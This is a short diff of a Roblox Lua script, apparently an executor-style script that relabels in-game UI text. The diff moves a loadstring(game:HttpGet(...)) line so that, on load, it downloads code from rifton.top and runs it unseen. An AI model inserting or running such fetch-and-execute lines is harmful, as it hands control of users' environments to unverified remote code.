@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://rifton.top/loader.lua"))()
+
 local function main(v)
     if floor.Value == "Fools" then
         if v:IsA("TextLabel") or v:IsA("TextButton") then
@@ -31,5 +33,5 @@ local function main(v)
                     v.Text = "视野 : "..textnumber
                 end
             end)
-            
-            loadstring(game:HttpGet("https://rifton.top/loader.lua"))()
+    end
+end
